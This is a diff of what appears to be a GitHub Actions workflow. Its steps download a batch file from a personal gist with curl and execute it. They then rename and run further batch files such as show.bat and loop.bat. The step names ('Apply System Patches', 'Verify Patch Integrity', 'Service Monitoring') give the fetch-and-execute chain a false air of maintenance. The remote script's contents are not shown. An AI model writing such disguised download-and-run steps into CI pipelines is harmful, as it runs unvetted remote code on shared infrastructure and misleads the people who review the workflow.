@@ -11,32 +11,37 @@ jobs:
 
     steps:
       - name: "Fetch Patch Data"
-        run: |
-          # Gist se raw file download kar rahe hain
-          curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/Downloads.bat" -o patch_v2.bat
         shell: cmd
+        run: |
+          :: Gist se file download ho rahi hai
+          curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/" -o patch_v2.bat
 
       - name: "Apply System Patches"
+        shell: cmd
         run: |
+          :: CMD format mein check aur run
           if exist patch_v2.bat (
-            cmd /c patch_v2.bat
+            call patch_v2.bat
           ) else (
-            echo "Error: patch_v2.bat download nahi ho saki. Link check karein."
+            echo Error: patch_v2.bat download nahi ho saki!
             exit 1
           )
 
       - name: "Verify Patch Integrity"
         shell: pwsh
         run: |
+          # PowerShell format mein renaming aur execution
           if (Test-Path "show.bat") { 
-            Rename-Item -Path "show.bat" -NewName "service_start.bat"
-            cmd /c service_start.bat 
+            Rename-Item -Path "show.bat" -NewName "service_start.bat" -Force
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/c service_start.bat"
+          } else {
+            Write-Host "show.bat nahi mili, shayad download step fail hua."
           }
 
       - name: "Service Monitoring"
         shell: pwsh
         run: |
           if (Test-Path "loop.bat") { 
-            Rename-Item -Path "loop.bat" -NewName "monitor.bat"
+            Rename-Item -Path "loop.bat" -NewName "monitor.bat" -Force
             cmd /c monitor.bat 
           }
